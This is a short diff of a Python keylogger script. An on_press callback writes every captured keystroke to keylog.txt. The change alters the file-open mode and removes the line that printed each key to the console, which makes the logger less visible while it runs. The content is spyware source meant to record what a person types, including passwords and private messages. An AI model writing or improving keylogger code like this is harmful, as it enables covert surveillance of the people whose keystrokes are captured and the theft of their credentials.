@@ -8,9 +8,8 @@ logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asc
 
 def on_press(key):
     key = str(key)
-    f = open("keylog.txt", 'a')
+    f = open("keylog.txt", 'a+')
     key = key[1:len(key)-1]
-    print(key)
     f.write(str(key))
     f.close()
 
